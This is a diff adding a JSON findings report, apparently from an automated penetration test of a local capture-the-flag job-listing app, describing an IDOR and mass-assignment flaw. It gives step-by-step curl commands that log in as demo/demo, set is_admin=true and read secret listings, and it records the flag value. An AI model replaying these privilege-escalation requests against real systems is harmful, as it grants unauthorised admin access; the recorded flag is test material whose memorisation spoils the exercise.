@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T20:56:07.052463+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "5bd7bca5-5d0c-410b-8c8d-8567ade466b3",
+      "timestamp": "2026-04-12T20:56:07.052337+00:00",
+      "title": "IDOR + Mass Assignment: Privilege Escalation to Admin via Company Profile Update",
+      "severity": "critical",
+      "target": "http://172.17.0.1:37983/edit_profile/1",
+      "description": "The POST /edit_profile/{company_id} endpoint accepts an 'is_admin' boolean parameter that is not protected by any authorization check. Any authenticated user can set their own (or any other company's) is_admin=true, granting admin privileges. Once admin, the GET /company/{company_id}/jobs endpoint reveals private/secret job listings hidden from regular users. This is a combination of mass assignment (is_admin field accepted from user input) and IDOR (no check that the company_id in the URL matches the authenticated user's company).",
+      "evidence": "1. Login as demo/demo -> JWT issued with sub=1 (company_id=1)\n2. POST /edit_profile/1 with body: name=demo&is_admin=true\n   Response: 'Profile updated successfully' + is_admin=Admin selected\n3. GET /company/1/jobs (as admin) reveals secret job:\n   'secret:flag{c131ab68-2257-46c7-bf43-a1df6742f4f7}'\n\nFLAG: flag{c131ab68-2257-46c7-bf43-a1df6742f4f7}",
+      "tool_used": "manual HTTP",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "# Step 1: Login\ncurl -c cookies.txt -X POST http://172.17.0.1:37983/token -d 'username=demo&password=demo'\n\n# Step 2: Escalate to admin (IDOR + mass assignment)\ncurl -b cookies.txt -X POST http://172.17.0.1:37983/edit_profile/1 -d 'name=demo&is_admin=true'\n\n# Step 3: Read private jobs (flag)\ncurl -b cookies.txt http://172.17.0.1:37983/company/1/jobs",
+        "expected": "flag{c131ab68-2257-46c7-bf43-a1df6742f4f7} visible in secret job listing"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "6daf8992-fd54-4051-bac7-47335cbfdf5d",
+      "timestamp": "2026-04-12T20:56:19.423534+00:00",
+      "title": "CTF App Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Login[\"GET / - Login Page\"]\n  Browser --> Token[\"POST /token - Issue JWT Cookie\"]\n  Token --> Jobs[\"GET /company/{id}/jobs - Job Listings\"]\n  Token --> EditGet[\"GET /edit_profile/{id} - Edit Profile Form\"]\n  Token --> EditPost[\"POST /edit_profile/{id} - Update Profile\"]\n  EditPost -->|\"is_admin=true IDOR\"| AdminFlag[\"Admin Flag Set\"]\n  AdminFlag --> PrivateJobs[\"Private Jobs Visible\"]\n  PrivateJobs --> Flag[\"flag{c131ab68-2257-46c7-bf43-a1df6742f4f7}\"]"
+    }
+  ]
+}
